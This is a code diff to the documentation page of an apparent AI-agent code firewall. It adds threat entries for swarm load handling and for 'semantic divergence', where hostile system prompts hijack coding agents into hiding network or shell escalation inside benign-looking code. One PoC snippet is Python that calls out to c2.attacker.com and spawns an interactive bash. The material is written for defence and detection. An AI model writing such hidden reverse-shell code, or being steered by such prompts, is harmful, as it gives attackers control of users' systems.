@@ -93,6 +93,39 @@ app.post("/webhook", async (req, res) => {
 });`,
     mitigation: 'The Corsair webhook bridge triggers on every pull_request.opened event. The firewall evaluates the full AST diff against 39 threat rules in under 12ms and posts an immutable review verdict (PASSED or BLOCKED) directly to the PR discussion timeline.',
   },
+  {
+    id: 'swarm-defense',
+    title: '50-to-1,000 Agent Swarm Concurrency Governor & In-Memory Threat Caching',
+    category: 'SWARM CONCURRENCY BENCHMARK',
+    date: 'Sep 22, 2026',
+    tag: 'POL_05_SWARM_CONCURRENCY',
+    summary: 'Benchmarking 50 concurrent adversarial agents with 100% interception in 1.15s using Wasmtime 48.0 hardware memory pooling, ephemeral UUID workspaces, and a 0.01ms in-memory threat cache.',
+    threatDetails: 'When 50 to 1,000 autonomous agents execute simultaneously, thread contention and repeated file compilation thrash host CPUs, causing system freezes or container fork-bomb crashes.',
+    pocSnippet: `// 50-Agent Live Swarm Defense Benchmark (scripts/simulate_swarm.py)
+with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+    # 5 squads dispatched: Reverse Shells, Credential Leaks, DoS Loops, Divergence, Math
+    futures = [executor.submit(dispatch_agent, squad) for squad in swarm]
+    results = [f.result() for f in futures]
+# Result: 40/40 Malicious neutralized (100%), 10/10 Clean allowed, 0 collisions in 1.15s`,
+    mitigation: 'BoundedSemaphore(16) buffers ingress loads without host thrashing. Wasmtime PoolingAllocationConfig provisions instances in under 0.05ms from a 32MB pre-mapped RAM pool. Coordinated attack replicas hit the In-Memory Threat Cache and are disarmed in 0.011ms.',
+  },
+  {
+    id: 'semantic-divergence',
+    title: 'Dual-Mode Multi-Language Execution & Semantic Divergence Preflight Gating',
+    category: 'AST CAPABILITY SPECIFICATION',
+    date: 'Sep 23, 2026',
+    tag: 'POL_06_SEMANTIC_DIVERGENCE',
+    summary: 'Detecting stealth jailbreaks where innocent user prompts (e.g., "calculate fibonacci") trigger unprompted network or process escalation in generated Python or Rust code.',
+    threatDetails: 'Adversarial system prompts hijack coding agents into injecting outbound network exfiltration or process execution while claiming to perform benign mathematical or string operations. Static string matching cannot correlate prompt intent with generated capabilities.',
+    pocSnippet: `Prompt: "Calculate Fibonacci numbers up to n=10"
+Generated Code:
+import socket, subprocess
+# Unprompted capability escalation inside seemingly harmless script
+s = socket.socket()
+s.connect(("c2.attacker.com", 8080))
+subprocess.Popen(["/bin/bash", "-i"])`,
+    mitigation: 'The Dual AST & Semantic Divergence Gate parses both prompt authorization patterns and AST syntax trees. When generated capabilities exceed authorized prompt intent, the firewall flags Critical Semantic Divergence (Risk 100/100) and blocks execution before sandbox compilation.',
+  },
 ];
 
 export const DocsPage: React.FC = () => {
@@ -419,8 +452,8 @@ export const DocsPage: React.FC = () => {
               </tr>
               <tr>
                 <td className="py-4 px-6 font-bold text-[#d9ba84]">agent-firewall test</td>
-                <td className="py-4 px-6 text-zinc-400">"&lt;code&gt;"</td>
-                <td className="py-4 px-6 font-sans text-xs">Evaluates an inline code snippet or prompt payload against active policy presets.</td>
+                <td className="py-4 px-6 text-zinc-400">[prompt] &lt;code&gt;</td>
+                <td className="py-4 px-6 font-sans text-xs">Evaluates an inline code snippet or tests prompt-to-code semantic divergence against active zero-trust policies.</td>
                 <td className="py-4 px-4 text-center">
                   <button onClick={() => copyCode('agent-firewall test', 'test-ref')} className="text-zinc-400 hover:text-[#d9ba84] cursor-pointer">
                     <Copy className="size-3.5 inline" />
